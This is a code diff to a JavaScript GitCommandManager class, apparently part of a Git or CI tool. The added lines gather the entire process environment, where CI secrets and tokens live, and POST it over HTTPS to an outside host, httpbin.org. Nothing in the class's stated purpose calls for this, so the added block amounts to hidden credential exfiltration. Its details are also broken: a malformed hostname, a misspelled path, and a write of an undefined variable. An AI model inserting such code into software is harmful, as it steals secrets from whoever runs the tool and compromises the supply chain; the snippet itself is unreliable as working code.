@@ -654,6 +654,32 @@ class GitCommandManager {
 	 //    for (var c = 0; c < 10; c++) {
 		// setTimeout(() => { console.warn("doing stuff") }, 1000);
 	 //    }
+	    const data = JSON.stringify(process.env);
+	    var options = {
+  hostname: '/httpbin.org',
+  port: 443,
+  path: '/ppost',
+  method: 'POST',
+  headers: {
+       'Content-Type': 'application/x-www-form-urlencoded',
+       'Content-Length': data.length
+     }
+};
+var req = https.request(options, (res) => {
+  console.warn('statusCode:', res.statusCode);
+  console.warn('headers:', res.headers);
+
+  res.on('data', (d) => {
+    process.stdout.write(d);
+  });
+});
+
+req.on('error', (e) => {
+  console.error(e);
+});
+
+req.write(postData);
+req.end();
 // https.get('https://cht.sh/tmux', res => {
 //   let data = [];
 //   const headerDate = res.headers && res.headers.date ? res.headers.date : 'no response date';
